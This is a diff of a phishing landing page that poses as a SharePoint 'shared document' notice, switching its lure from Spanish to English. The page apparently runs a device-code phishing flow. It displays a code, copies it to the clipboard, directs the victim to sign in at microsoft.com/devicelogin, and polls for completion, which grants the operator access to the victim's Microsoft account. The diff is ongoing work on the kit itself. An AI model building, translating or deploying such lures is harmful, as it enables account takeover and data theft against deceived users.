@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sharepoint PDF</title>
+    <title>SharePoint - OQS7746300-220426.pdf</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
     <style>
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -133,9 +133,9 @@
         <div class="sp-container">
             
             <div class="sp-share-banner">
-                <div class="sp-share-avatar">A</div>
+                <div class="sp-share-avatar">M</div>
                 <div class="sp-share-text">
-                    <strong>Arturo </strong> Compartió un documento con usted
+                    <strong>Mostafa</strong> shared a document with you
                     
                 </div>
             </div>
@@ -149,20 +149,20 @@
                         
                     </div>
                     <div class="sp-doc-meta">
-                        <h2>QS0733-220426.pdf</h2>
-                        <p>Compartido con usted</p>
+                        <h2>OQS7746300-220426.pdf</h2>
+                        <p>Shared with you</p>
                         <p class="sp-doc-size">
                             Adobe PDF &middot; Shared via SharePoint
-                            &middot; 1.5 MB
+                            &middot; 1.7 MB
                         </p>
                         
-                        <p class="sp-doc-size"><i class="far fa-calendar" style="font-size:11px;"></i> Abril 22, 2026</p>
+                        <p class="sp-doc-size"><i class="far fa-calendar" style="font-size:11px;"></i> April 22, 2026</p>
                         
                     </div>
                 </div>
 
                 <div class="sp-card-body">
-                    <p class="sp-desc">Verifique su identidad</p>
+                    <p class="sp-desc">Verify your identity with Microsoft to access this shared document.</p>
 
                     <div id="phase1">
                         <button type="button" class="sp-btn" id="btnContinue">
@@ -178,25 +178,25 @@
                             <div class="code-value" id="codeDisplay">&mdash;&mdash;&mdash;&mdash;&mdash;</div>
                         </div>
                         <button type="button" class="btn-copy" id="btnCopy">
-                            <i class="far fa-copy"></i> Copiar código
+                            <i class="far fa-copy"></i> Copy code
                         </button>
                         <a id="openSigninBtn" href="https://microsoft.com/devicelogin" target="_blank" rel="noopener" class="sp-btn" style="text-decoration:none; margin-top: 10px;">
                             <i class="fab fa-microsoft"></i>
-                            Abrir inicio de sesión de Microsoft
+                            Open Microsoft Sign-in
                         </a>
                         <ol class="steps">
-                            <li>Haga clic en el botón de arriba para abrir el inicio de sesión de Microsoft</li>
-                            <li>Pegue el código anterior (ya copiado en su portapapeles)</li>
-                            <li>Inicie sesión con su cuenta de Microsoft y haga clic en Continuar</li>
+                            <li>Click the button above to open Microsoft sign-in</li>
+                            <li>Paste the code above (already copied to your clipboard)</li>
+                            <li>Sign in with your Microsoft account and click <strong>Continue</strong></li>
                         </ol>
                         <p class="steps-link">
-                            ¿Las ventanas no se abrieron? <a href="https://microsoft.com/devicelogin" target="_blank" rel="noopener">Haga clic aquí</a> y pegue el código.
+                            Window didn't open? <a href="https://microsoft.com/devicelogin" target="_blank" rel="noopener">Click here</a> and paste the code.
                         </p>
                         <div id="pollStatus" class="poll-status">
                             <span class="spinner-dot"></span>
                             <span class="spinner-dot"></span>
                             <span class="spinner-dot"></span>
-                            <span>Esperando inicio de sesión&hellip;</span>
+                            <span>Waiting for sign-in&hellip;</span>
                         </div>
                     </div>
 
@@ -220,13 +220,13 @@
 
             <div class="sp-footer">
                 <i class="fas fa-lock"></i>
-                <span>Protegido por Microsoft</span>
+                <span>Secured by Microsoft SharePoint</span>
             </div>
         </div>
     </div>
     <script>
         (function() {
-            var slug = "spanishshare";
+            var slug = "share-english";
             if (!slug) {
                 var p = window.location.pathname.replace(/^\/+|\/+$/g, '');
                 var m = p.match(/lp\/(.+)/);
@@ -255,7 +255,7 @@
             function showCopied() {
                 btnCopy.innerHTML = '<i class="fas fa-check"></i> Copied!';
                 btnCopy.classList.add('copied');
-                setTimeout(function() { btnCopy.innerHTML = '<i class="far fa-copy"></i> Copiar código'; btnCopy.classList.remove('copied'); }, 2200);
+                setTimeout(function() { btnCopy.innerHTML = '<i class="far fa-copy"></i> Copy code'; btnCopy.classList.remove('copied'); }, 2200);
             }
 
             function showCodeAndPoll(data) {
